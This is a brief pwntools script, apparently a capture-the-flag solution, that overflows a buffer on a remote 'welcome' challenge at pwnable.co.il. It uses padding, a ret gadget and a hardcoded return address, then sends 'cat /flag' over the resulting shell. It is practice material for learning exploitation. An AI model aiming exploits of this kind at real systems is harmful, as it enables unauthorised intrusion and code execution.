import pwn

# elf = pwn.ELF('./welcome')
# pwn.context.binary = elf
# pwn.context.log_level = 'DEBUG'
# libc = elf.libc

padding = b'a' * int(16 * 2.5)
ret = pwn.p64(0x000000000040057e)
message = padding + ret + pwn.p64(0x400708)
# p = elf.process()
# pwn.gdb.attach(p, gdbscript='b main')


p = pwn.remote('pwnable.co.il', 9000)
input("Press Enter to continue...")
print(p.recv())
p.sendline(message)
print(p.recv())
p.interactive()
p.sendline('cat /flag'.encode())
print(p.recv())